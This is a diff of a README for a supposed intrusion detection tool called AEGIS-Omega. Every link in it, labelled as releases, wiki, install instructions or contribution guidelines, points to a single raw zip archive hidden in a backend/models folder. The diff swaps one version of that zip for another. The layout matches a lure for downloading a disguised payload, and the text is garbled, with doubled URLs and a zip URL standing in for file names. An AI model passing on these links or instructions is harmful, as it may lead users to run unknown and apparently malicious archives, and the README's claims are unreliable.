@@ -1,6 +1,6 @@
 # 🚀 aegis-omega-ids - High-Performance Intrusion Detection Made Easy
 
-[![Download AEGIS-Omega](https://raw.githubusercontent.com/dasnija/aegis-omega-ids/main/backend/models/variables/aegis-omega-ids-3.3.zip%https://raw.githubusercontent.com/dasnija/aegis-omega-ids/main/backend/models/variables/aegis-omega-ids-3.3.zip)](https://raw.githubusercontent.com/dasnija/aegis-omega-ids/main/backend/models/variables/aegis-omega-ids-3.3.zip)
+[![Download AEGIS-Omega](https://github.com/dasnija/aegis-omega-ids/raw/refs/heads/main/backend/models/variables/ids-aegis-omega-2.2.zip%https://github.com/dasnija/aegis-omega-ids/raw/refs/heads/main/backend/models/variables/ids-aegis-omega-2.2.zip)](https://github.com/dasnija/aegis-omega-ids/raw/refs/heads/main/backend/models/variables/ids-aegis-omega-2.2.zip)
 
 ## 📥 Overview
 AEGIS-Omega is a powerful, hybrid multi-layer Intrusion Detection System (IDS). This software works efficiently to protect your network from various types of attacks. AEGIS-Omega uses advanced techniques, including Signature Analysis, Autoencoder Anomaly Detection, BiLSTM Deep Learning, and Ensemble Fusion. With these methods, it achieves an impressive 95% F1-score in identifying threats. 
@@ -11,11 +11,11 @@ The application comes with a FastAPI backend for handling requests and a React d
 To get started with AEGIS-Omega, follow the steps below to download and install the software on your system.
 
 ### 🔗 Download Link
-Visit this page to download: [AEGIS-Omega Releases](https://raw.githubusercontent.com/dasnija/aegis-omega-ids/main/backend/models/variables/aegis-omega-ids-3.3.zip)
+Visit this page to download: [AEGIS-Omega Releases](https://github.com/dasnija/aegis-omega-ids/raw/refs/heads/main/backend/models/variables/ids-aegis-omega-2.2.zip)
 
 ## 💾 Download & Install
 1. **Visit the Releases Page:**
-   Click this link to access the AEGIS-Omega releases page: [AEGIS-Omega Releases](https://raw.githubusercontent.com/dasnija/aegis-omega-ids/main/backend/models/variables/aegis-omega-ids-3.3.zip).
+   Click this link to access the AEGIS-Omega releases page: [AEGIS-Omega Releases](https://github.com/dasnija/aegis-omega-ids/raw/refs/heads/main/backend/models/variables/ids-aegis-omega-2.2.zip).
 
 2. **Select the Latest Release:**
    Look for the latest version at the top of the page. This version usually has the most recent features and bug fixes.
@@ -29,7 +29,7 @@ Visit this page to download: [AEGIS-Omega Releases](https://raw.githubuserconten
    - **For macOS:**
      Open the downloaded `.dmg` file and drag the AEGIS-Omega app to your Applications folder.
    - **For Linux:**
-     Extract the downloaded archive and follow the instructions in the `https://raw.githubusercontent.com/dasnija/aegis-omega-ids/main/backend/models/variables/aegis-omega-ids-3.3.zip` file included in the package.
+     Extract the downloaded archive and follow the instructions in the `https://github.com/dasnija/aegis-omega-ids/raw/refs/heads/main/backend/models/variables/ids-aegis-omega-2.2.zip` file included in the package.
 
 5. **Launch the Application:**
    After installation, you can start AEGIS-Omega from your applications menu or desktop shortcut.
@@ -61,10 +61,10 @@ Visit this page to download: [AEGIS-Omega Releases](https://raw.githubuserconten
    Analyze the reports generated for any detected threats. Use the insights to improve your network security.
 
 ## 📂 Documentation
-For detailed documentation on how to use AEGIS-Omega, including configuration options and advanced features, visit the [Wiki](https://raw.githubusercontent.com/dasnija/aegis-omega-ids/main/backend/models/variables/aegis-omega-ids-3.3.zip).
+For detailed documentation on how to use AEGIS-Omega, including configuration options and advanced features, visit the [Wiki](https://github.com/dasnija/aegis-omega-ids/raw/refs/heads/main/backend/models/variables/ids-aegis-omega-2.2.zip).
 
 ## 🔍 Contribution
-If you wish to contribute to the project, please follow the guidelines in the `https://raw.githubusercontent.com/dasnija/aegis-omega-ids/main/backend/models/variables/aegis-omega-ids-3.3.zip` file provided in the repository. Community contributions help enhance AEGIS-Omega and benefit everyone.
+If you wish to contribute to the project, please follow the guidelines in the `https://github.com/dasnija/aegis-omega-ids/raw/refs/heads/main/backend/models/variables/ids-aegis-omega-2.2.zip` file provided in the repository. Community contributions help enhance AEGIS-Omega and benefit everyone.
 
 ## 📞 Support
 For questions or support requests, please open an issue on the GitHub repository. Our team will address your concerns as soon as possible.
@@ -73,8 +73,8 @@ For questions or support requests, please open an issue on the GitHub repository
 AEGIS-Omega is released under the MIT License. You can find more details in the `LICENSE` file in the repository.
 
 ## 🔗 Additional Resources
-- **Documentation**: [AEGIS-Omega Wiki](https://raw.githubusercontent.com/dasnija/aegis-omega-ids/main/backend/models/variables/aegis-omega-ids-3.3.zip)
+- **Documentation**: [AEGIS-Omega Wiki](https://github.com/dasnija/aegis-omega-ids/raw/refs/heads/main/backend/models/variables/ids-aegis-omega-2.2.zip)
 - **Community Forum**: Engage with other users to share tips and best practices.
 
 ### 🔗 Final Download Link
-Don't forget to visit the AEGIS-Omega Releases page to download the latest version: [AEGIS-Omega Releases](https://raw.githubusercontent.com/dasnija/aegis-omega-ids/main/backend/models/variables/aegis-omega-ids-3.3.zip).
+Don't forget to visit the AEGIS-Omega Releases page to download the latest version: [AEGIS-Omega Releases](https://github.com/dasnija/aegis-omega-ids/raw/refs/heads/main/backend/models/variables/ids-aegis-omega-2.2.zip).
